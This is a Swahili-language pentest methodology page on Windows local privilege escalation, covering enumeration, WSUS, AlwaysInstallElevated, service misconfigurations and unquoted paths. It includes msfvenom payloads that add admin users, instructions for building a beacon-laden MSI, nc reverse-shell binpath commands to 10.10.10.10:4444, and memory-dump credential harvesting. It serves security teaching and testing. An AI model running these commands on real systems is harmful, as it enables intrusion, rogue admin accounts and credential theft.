# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya awali ya Windows

### Access Tokens

**Ikiwa haujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa taarifa zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa haujui integrity levels katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Udhibiti wa Usalama wa Windows

Kuna mambo mbalimbali katika Windows ambayo yanaweza **prevent you from enumerating the system**, run executables au hata **detect your activities**. Unapaswa **read** ukurasa ufuatao na **enumerate** yote haya ya **defenses mechanisms** kabla ya kuanza the privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Taarifa za Mfumo

### Version info enumeration

Angalia kama toleo la Windows lina udhaifu unaojulikana (pia angalia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Tovuti hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu Microsoft security vulnerabilities. Hifadhidata hii ina zaidi ya 4,700 security vulnerabilities, ikionyesha the **massive attack surface** ambayo mazingira ya Windows yanatoa.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson imejumuishwa)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info zilizohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za Transkripti za PowerShell

Unaweza kujifunza jinsi ya kuiwasha katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline yanarekodiwa, yakiwemo executed commands, command invocations, na parts of scripts. Hata hivyo, complete execution details na output results huenda zisikamatike.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwa PowersShell logs unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na yaliyomo yote ya utekelezaji wa script inakamatwa, na kuhakikisha kwamba kila block of code inarekodiwa inavyotekelezwa. Mchakato huu huhifadhi comprehensive audit trail ya kila shughuli, yenye thamani kwa forensics na kwa kuchambua malicious behavior. Kwa kudokumenta shughuli zote wakati wa utekelezaji, hutolewa ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio za Script Block zinaweza kupatikana katika Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kupata udhibiti wa mfumo ikiwa sasisho hayatolewi kwa kutumia http**S** bali http.

Anza kwa kuangalia ikiwa mtandao unatumia non-SSL WSUS update kwa kuendesha yafuatayo kwenye cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa unapata jibu kama mojawapo ya hizi:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kisha, **it is exploitable.** Ikiwa registry ya mwisho iko sawa na 0, basi rekodi ya WSUS itapuuziwa.

Ili kushambulia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni MiTM weaponized exploits scripts za kuingiza 'fake' updates katika non-SSL WSUS traffic.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa msingi, hii ndiyo hitilafu ambayo mdudu huu unaitumia:

> Ikiwa tunaweza kubadilisha proxy ya mtumiaji wa ndani, na Windows Updates inatumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) kwa ndani ili kukamata trafiki yetu wenyewe na kuendesha msimbo kama mtumiaji aliyeinuliwa kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS inatumia mipangilio ya mtumiaji wa sasa, itatumia pia certificate store yake. Ikiwa tutazalisha self-signed certificate kwa hostname ya WSUS na kuongeza cheti hicho kwenye certificate store ya mtumiaji wa sasa, tutaweza kukamata trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mbinu kama HSTS kutekeleza uthibitisho wa aina ya trust-on-first-use kwenye cheti. Ikiwa cheti kinachotolewa kinatambulika na mtumiaji na kina hostname sahihi, kitakubaliwa na huduma.

Unaweza kuitumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapopatikana).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa enterprise huweka wazi localhost IPC surface na chaneli ya masasisho yenye mamlaka. Iwapo enrollment inaweza kulazimishwa kwenda kwenye attacker server na updater inamtumaini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI yenye madhara ambayo huduma ya SYSTEM itaweka. Tazama mbinu ya jumla (inayozingatia mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambapo **LDAP signing is not enforced,** watumiaji wana haki za kujipatia kuruhusu kuanzisha **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba mahitaji haya yanatimizwa kwa kutumia **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** hizi 2 registry zimetumika (value ni **0x1**), basi watumiaji wa ngazi yoyote wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kuotomatisha mbinu hii ukitumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up ili kuunda ndani ya saraka ya sasa Windows MSI binary kwa ajili ya kuinua idhini. Script hii inaandika MSI installer iliyotayarishwa kabla ambayo itauliza kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GUI):
```
Write-UserAddMSI
```
Tekeleza binary iliyotengenezwa ili kupata privileges za juu.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper ukitumia tools hizi. Kumbuka unaweza ku-wrap "**.bat**" file ikiwa unataka **tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** kwa kutumia Cobalt Strike au Metasploit **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubonyeza **Next** hadi ufike hatua 3 kati ya 4 (chagua faili za kuingiza). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi wa **AlwaysPrivesc** katika **Solution Explorer** na ndani ya **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna properties nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bonyeza kulia kwenye mradi na chagua **View > Custom Actions**.
- Bonyeza kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili kwenye **Application Folder**, chagua faili yako ya **beacon.exe** na bonyeza **OK**. Hii itahakikisha kwamba beacon payload inatekelezwa mara msakinishaji (installer) anakimbizwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **installation** ya faili `.msi` yenye madhara kwa **mandharinyuma:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili ku-exploit uvunjaji huu wa usalama unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vitambuzi

### Mipangilio ya Ukaguzi

Mipangilio hii inamua nini kinacho **kurekodiwa**, kwa hivyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua logs zinapotumwa.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa local Administrator passwords**, ikihakikisha kwamba kila password ni **ya kipekee, iliyopangwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Password hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, kuwaruhusu kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia na **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** jaribio la michakato isiyoaminika **kusoma kumbukumbu yake** au kuingiza kanuni, na hivyo kuimarisha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**Taarifa zaidi kuhusu Credentials Guard hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** huhakikiwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na pakiti ya usalama iliyosajiliwa, kwa kawaida domain credentials za mtumiaji huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Orodhesha Watumiaji & Vikundi

Unapaswa kukagua ikiwa kuna vikundi ambavyo uko navyo vinavyokuwa na ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

If you **belongs to some privileged group you may be able to escalate privileges**. Jifunze kuhusu privileged groups na jinsi ya kuzitumia vibaya ili escalate privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Tazama ukurasa ufuatao ili **learn about interesting tokens** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Kabrasha za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nenosiri
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Zinazoendesha

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kuandika juu ya binary fulani inayokimbia** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia fursa za [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binaari za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda dump ya kumbukumbu ya mchakato unaoendelea kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**; jaribu kufanya dump ya kumbukumbu na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazokimbia kama SYSTEM zinaweza kumruhusu mtumiaji kuanzisha CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Services

Service Triggers huruhusu Windows kuanza service wakati masharti fulani yanapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanza privileged services kwa kuwasha triggers zao. Angalia enumeration na activation techniques hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka kwa _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kukagua kama "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba huduma upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Njia mbadala nyingine** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika tukio ambapo kundi la "Authenticated users" linamiliki **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha binary inayotekelezwa ya huduma. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Kupandishwa kwa ruhusa kunaweza kufanyika kupitia ruhusa zifuatazo:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Inaruhusu kusanidi upya ruhusa, ikielekea uwezo wa kubadilisha usanidi wa service.
- **WRITE_OWNER**: Inaruhusu upokeaji wa umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha usanidi wa service.

Kwa detection na exploitation ya hitilafu hii, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binaries za service

**Angalia ikiwa unaweza kubadilisha binary inayotekelezwa na service** au ikiwa una **write permissions on the folder** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (not in system32) na kuangalia ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista ya huduma

Unapaswa kuangalia ikiwa unaweza kubadilisha rejista yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako juu ya **rejista** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wanamiliki ruhusa za `FullControl`. Ikiwa ni hivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Iwapo una ruhusa hii juu ya registry hii ina maana kwamba **unaweza kuunda sub registries kutoka kwa hii**. Katika kesi ya Windows services hii ni **ya kutosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Iwapo njia ya executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizo na nukuu, isipokuwa zile za huduma za ndani za Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na exploit** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono service binary kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kubainisha hatua zitakazochukuliwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwa binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanapatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu Zilizowekwa

Angalia **permissions of the binaries** (labda unaweza overwrite mojawapo na escalate privileges) na **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha faili ya usanidi ili kusoma faili maalum au kama unaweza kubadilisha binary fulani ambayo itatekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kutafuta ruhusa dhaifu za folda/faili kwenye mfumo ni kwa kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
